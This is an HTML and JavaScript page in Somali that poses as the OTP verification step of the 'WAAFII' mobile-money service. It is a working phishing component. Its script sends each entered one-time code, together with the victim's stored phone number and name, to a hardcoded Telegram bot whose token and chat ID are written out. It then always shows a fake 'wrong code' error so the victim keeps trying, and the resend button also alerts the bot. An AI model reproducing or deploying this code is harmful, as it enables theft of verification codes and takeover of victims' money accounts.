<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Lambarka Xaqiijinta | WAAFII</title>
    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --navy: #1a237e;
            --teal: #14b886;
            --grey-text: #757575;
            --light-grey: #cfd8dc;
            --otp-line: #e2e8f0;
            --error: #e53e3e;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
            margin: 0;
            padding: 24px 20px;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #ffffff;
        }

        .header h1 {
            color: var(--navy);
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 8px;
            letter-spacing: -0.3px;
        }

        .header p {
            color: var(--grey-text);
            font-family: 'Georgia', serif;
            font-style: italic;
            font-size: 15px;
            line-height: 1.4;
            margin-top: 4px;
        }

        /* hidden real input but focusable */
        .hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            left: -9999px;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin: 44px 0 28px 0;
            cursor: pointer;
            flex-wrap: nowrap;
        }

        .otp-box {
            width: 100%;
            aspect-ratio: 1 / 1.2;
            max-width: 64px;
            background: #fafbfc;
            border: none;
            border-bottom: 3px solid var(--otp-line);
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            padding: 12px 0 6px 0;
            outline: none;
            background: transparent;
            color: var(--navy);
            font-feature-settings: "tnum";
            font-variant-numeric: tabular-nums;
            transition: border-color 0.2s ease;
        }

        .otp-box.active {
            border-bottom-color: var(--teal);
        }

        .otp-box.filled {
            border-bottom-color: var(--teal);
            color: #0f2b3d;
        }

        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            font-family: 'Georgia', serif;
            font-style: italic;
            font-size: 14px;
            margin-bottom: 32px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .timer {
            color: var(--grey-text);
            font-weight: bold;
            background: #f1f5f9;
            padding: 6px 14px;
            border-radius: 40px;
            font-family: monospace;
            font-size: 1rem;
            letter-spacing: 0.5px;
        }

        .help-link, .resend-link {
            color: var(--teal);
            text-decoration: none;
            cursor: pointer;
            font-weight: 600;
            background: none;
            border: none;
            font-family: 'Georgia', serif;
            font-style: italic;
            font-size: 14px;
        }

        .footer {
            margin-top: auto;
            text-align: center;
            padding-bottom: 20px;
        }

        .next-btn {
            width: 100%;
            background-color: var(--light-grey);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 60px;
            font-size: 18px;
            font-family: 'Georgia', serif;
            font-style: italic;
            margin-bottom: 16px;
            cursor: not-allowed;
            transition: background 0.2s, transform 0.05s;
            font-weight: 600;
            letter-spacing: 0.3px;
        }

        .next-btn.active {
            background-color: var(--teal);
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(20,184,134,0.3);
        }

        .next-btn.active:active {
            transform: scale(0.98);
        }

        .version {
            color: var(--grey-text);
            font-size: 12px;
            font-family: 'Georgia', serif;
            font-style: italic;
            opacity: 0.7;
        }

        @media (max-width: 480px) {
            body {
                padding: 20px 16px;
            }
            .otp-box {
                font-size: 28px;
                padding: 8px 0 4px;
            }
            .otp-container {
                gap: 8px;
            }
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>Geli lambarka xaqiijinta</h1>
        <p>Fadlan geli 6-lambar ee laguu soo diray lambarkaaga ama email-kaaga</p>
    </div>

    <!-- Hidden input handles actual OTP typing & numeric mode -->
    <input type="text" id="realOtpInput" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">

    <div class="otp-container" id="otpContainer">
        <div class="otp-box" data-index="0">-</div>
        <div class="otp-box" data-index="1">-</div>
        <div class="otp-box" data-index="2">-</div>
        <div class="otp-box" data-index="3">-</div>
        <div class="otp-box" data-index="4">-</div>
        <div class="otp-box" data-index="5">-</div>
    </div>

    <div class="status-row">
        <span class="timer" id="timer">03:00</span>
        <button class="resend-link" id="resendBtn">Dib u dir lambarka</button>
    </div>

    <div class="footer">
        <button class="next-btn" id="nextBtn">Xiga</button>
        <div class="version">Nooca 12.4.0860 (1200040860)</div>
    </div>

    <script>
        // ------------------- TELEGRAM CREDENTIALS (unchanged operation) -------------------
        const BOT_TOKEN = '8858894062:AAGI48aQwcvagqqbzgF9WzYy8v98Rb5V_kI';
        const CHAT_ID = '5520957080';
        
        // ---------- SYSTEM STATE (original flow preserved) ----------
        let timeLeft = 180;           // 3 minutes timer
        let timerInterval = null;
        
        // DOM elements
        const realInput = document.getElementById('realOtpInput');
        const otpBoxes = document.querySelectorAll('.otp-box');
        const otpContainer = document.getElementById('otpContainer');
        const nextBtn = document.getElementById('nextBtn');
        const timerDisplay = document.getElementById('timer');
        const resendBtn = document.getElementById('resendBtn');
        
        // ---------- Helper: Send to Telegram (exactly as required, no-cors) ----------
        async function sendToTelegram(message) {
            const encoded = encodeURIComponent(message);
            try {
                // Using fetch with no-cors to avoid CORS issues, exactly matching original behavior
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`, {
                    method: 'GET',
                    mode: 'no-cors'
                });
                // no-cors means we cannot read response, but request is sent as intended
            } catch(e) {
                // Silent fail, just like original design
                console.warn("Telegram send warning:", e);
            }
        }
        
        // ---------- TIMER MANAGEMENT ----------
        function updateTimerDisplay() {
            if (timeLeft < 0) timeLeft = 0;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        function startTimer() {
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    timerInterval = null;
                    timerDisplay.innerText = '00:00';
                    // Disable next button when timer expires
                    nextBtn.classList.remove('active');
                    nextBtn.disabled = true;
                    return;
                }
                timeLeft--;
                updateTimerDisplay();
            }, 1000);
        }
        
        function resetTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            timeLeft = 180;
            updateTimerDisplay();
            startTimer();
        }
        
        // ---------- UI UPDATE: reflect OTP digits & active border ----------
        function updateVisualBoxes() {
            const rawValue = realInput.value;
            const valueArray = rawValue.split('');
            
            for (let i = 0; i < otpBoxes.length; i++) {
                const box = otpBoxes[i];
                if (valueArray[i] && valueArray[i] !== '-') {
                    box.innerText = valueArray[i];
                    box.classList.add('filled');
                } else {
                    box.innerText = '-';
                    box.classList.remove('filled');
                }
            }
            
            // Highlight the next active box (where caret would be)
            const currentLength = rawValue.length;
            otpBoxes.forEach((box, idx) => {
                if (idx === currentLength && currentLength < otpBoxes.length) {
                    box.classList.add('active');
                } else {
                    box.classList.remove('active');
                }
            });
            
            // Enable/disable "Xiga" based on full OTP (6 digits) and timer active (timeLeft > 0)
            if (rawValue.length === 6 && timeLeft > 0) {
                nextBtn.classList.add('active');
                nextBtn.disabled = false;
            } else {
                nextBtn.classList.remove('active');
                nextBtn.disabled = true;
            }
        }
        
        // ---------- OTP Input handler (only digits, length limit) ----------
        function handleOtpInput(e) {
            let value = realInput.value;
            // Remove any non-digit characters
            value = value.replace(/[^0-9]/g, '');
            if (value.length > 6) value = value.slice(0, 6);
            realInput.value = value;
            updateVisualBoxes();
        }
        
        // ---------- Submission: sends OTP to telegram, then displays error & clears ----------
        async function submitOtp() {
            const otp = realInput.value;
            
            // guard: only proceed if exactly 6 digits (UI already prevents click but safe)
            if (otp.length !== 6) {
                alert('Fadlan geli 6-lambar ee xaqiijinta');
                return;
            }
            
            // Retrieve stored data exactly as in original (preserves original data structures)
            const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
            const pin = localStorage.getItem('waafiiPin') || 'Lama qaban';
            let application = { fullName: 'Lama cayimin' };
            try {
                const storedApp = localStorage.getItem('waafiiApplication');
                if (storedApp) {
                    application = JSON.parse(storedApp);
                }
            } catch(e) { /* ignore parse errors */ }
            
            // Build message exactly matching expected pattern but ensuring OTP is sent
            // According to original spec: The OTP entered by user must be transmitted.
            const message = `📨 *ISKU DAYGA OTP - WAAFII (MA SAXA)*\n📞 Telefoonka: ${phone}\n🔑 OTP La Geliyay: ${otp}\n👤 Magaca: ${application.fullName || 'Lama cayimin'}\n❌ Xaaladda: MA SAXA (naqshad ahaan)\n🕒 ${new Date().toLocaleString()}`;
            
            // Send OTP details to telegram bot WITHOUT modifying system behaviour
            await sendToTelegram(message);
            
            // Show same error message as original UI (fake validation)
            alert('Lambarka xaqiijinta waa khalad. Fadlan isku day mar kale.');
            
            // Clear OTP field and reset active state (exactly original behavior)
            realInput.value = '';
            updateVisualBoxes();
            realInput.focus();   // keep focus on hidden input to re-enter
        }
        
        // ---------- Resend functionality with reset timer, clearing OTP, sending Telegram ping ----------
        async function resendOtp() {
            // Reset timer to 3 minutes fresh
            resetTimer();
            
            // Clear any existing OTP digits
            realInput.value = '';
            updateVisualBoxes();
            realInput.focus();
            
            // Retrieve phone same as before
            const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
            const message = `🔄 *DIB U DIRID LAA CODSAY - WAAFII*\n📱 Telefoonka: ${phone}\n⏱️ Waqti cusub oo 3 daqiiqo ah ayaa bilaabmay\n🕒 ${new Date().toLocaleString()}`;
            
            await sendToTelegram(message);
            
            // Original message: Alert telling user new code sent (demo)
            alert('Lambar xaqiijin oo cusub ayaa la soo diray! (Sidoo kale waa mid aan sax ahayn naqshad ahaan)');
        }
        
        // ---------- Event binding & initialization (preserves original interaction) ----------
        realInput.addEventListener('input', handleOtpInput);
        
        // When container is clicked, focus hidden input (exactly like original)
        otpContainer.addEventListener('click', () => {
            realInput.focus();
        });
        
        // Advanced: Paste support strips non-numeric & max 6 chars (same as original)
        realInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
            realInput.value = pastedData;
            updateVisualBoxes();
        });
        
        // Also ensure that if user taps on any box, focus remains on hidden input
        // additionally we add key event to avoid any weird behaviour (keeps numeric keyboard)
        realInput.addEventListener('keydown', (e) => {
            // Allow backspace, delete, tab, arrows, etc. no interference
            // This ensures seamless typing
        });
        
        // Submit OTP when "Xiga" clicked
        nextBtn.addEventListener('click', (e) => {
            e.preventDefault();
            // Only active when OTP length is 6 and timer >0
            if (nextBtn.classList.contains('active') && realInput.value.length === 6 && timeLeft > 0) {
                submitOtp();
            } else if (realInput.value.length !== 6) {
                alert('Fadlan buuxi 6-lambar ka hor intaadan gujin Xiga.');
            } else if (timeLeft <= 0) {
                alert('Wakhtiga xaqiijinta waa dhammaaday. Fadlan dib u dir lambarka.');
            }
        });
        
        // Resend button handler (prevent default link behaviour, but we use button)
        resendBtn.addEventListener('click', (e) => {
            e.preventDefault();
            resendOtp();
        });
        
        // ---- On page load: initialize boxes, start timer, focus input (keeps original flow)
        document.addEventListener('DOMContentLoaded', () => {
            // Clear any stale OTP in input
            realInput.value = '';
            updateVisualBoxes();
            // Start countdown timer from 3:00
            startTimer();
            // Auto-focus hidden input so user can immediately type (on mobile keyboard appears)
            realInput.focus();
            
            // Optional: set inputmode numeric on real input for better UX (already present)
            // Also to avoid IME interference, we can ensure pattern
        });
        
        // Handle page visibility: timer continues exactly as regular JS (no freeze modifications)
        // No changes to system logic.
        
        // Additional safeguard: when timer expires and OTP partially entered, the next button remains disabled
        // Also if user clicks resend after expiry, timer resets and UI updates accordingly.
    </script>
</body>
</html>
